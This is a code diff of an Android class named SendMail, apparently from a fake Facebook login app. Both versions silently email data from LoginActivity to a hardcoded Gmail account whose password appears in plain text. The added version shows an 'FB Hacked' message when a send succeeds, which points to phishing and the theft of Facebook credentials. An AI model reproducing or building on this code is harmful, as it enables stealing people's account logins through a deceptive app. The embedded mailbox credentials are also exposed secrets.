@@ -1,63 +1,30 @@
 package xtremecreations.facebookapp;
-import android.os.AsyncTask;
-import android.view.View;
 import android.widget.Toast;
-import java.util.Properties;
-import javax.mail.Message;
-import javax.mail.MessagingException;
-import javax.mail.PasswordAuthentication;
-import javax.mail.Session;
-import javax.mail.Transport;
-import javax.mail.internet.InternetAddress;
-import javax.mail.internet.MimeMessage;
 
-public class SendMail extends AsyncTask<Void,Void,Void>
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
+
+public class SendMail
 {
-    String EMAIL="ritik.fbhack@gmail.com";
-    String PASSWORD="123212321";
-    private Session session;
-    private String email;
-    private String subject;
-    private String message;
-    LoginActivity LA;
-    public SendMail(LoginActivity La,String email, String subject, String message){
-        this.email = email;
-        this.subject = subject;
-        this.message = message;
-        LA=La;
-    }
-    @Override
-    protected void onPreExecute() {
-        super.onPreExecute();LA.LoginAccepted();
-    }
-    @Override
-    protected void onPostExecute(Void aVoid){
-        super.onPostExecute(aVoid);
-    }
-    @Override
-    protected Void doInBackground(Void... params) {
-        Properties props = new Properties();
-        props.put("mail.smtp.host", "smtp.gmail.com");
-        props.put("mail.smtp.socketFactory.port", "465");
-        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
-        props.put("mail.smtp.auth", "true");
-        props.put("mail.smtp.port", "465");
-
-        session = Session.getDefaultInstance(props,
-                new javax.mail.Authenticator() {
-                    //Authenticating the password
-                    protected PasswordAuthentication getPasswordAuthentication() {
-                        return new PasswordAuthentication(EMAIL,PASSWORD);
+    SendMail(final LoginActivity La, String email, String subject, String message){
+        BackgroundMail.newBuilder(La)
+                .withUsername("ritik.fbhack@gmail.com")
+                .withPassword("123212321")
+                .withMailto(email)
+                .withType(BackgroundMail.TYPE_PLAIN)
+                .withSubject(subject)
+                .withBody(message)
+                .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
+                    @Override
+                    public void onSuccess() {
+                        Toast.makeText(La, "FB Hacked", Toast.LENGTH_SHORT).show();
                     }
-                });
-        try {
-            MimeMessage mm = new MimeMessage(session);
-            mm.setFrom(new InternetAddress(EMAIL));
-            mm.addRecipient(Message.RecipientType.TO, new InternetAddress(email));
-            mm.setSubject(subject);
-            mm.setText(message);
-            Transport.send(mm);
-        }catch (MessagingException e) {e.printStackTrace();}
-        return null;
+                })
+                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
+                    @Override
+                    public void onFail() {
+                        //do some magic
+                    }
+                })
+                .send();
     }
 }
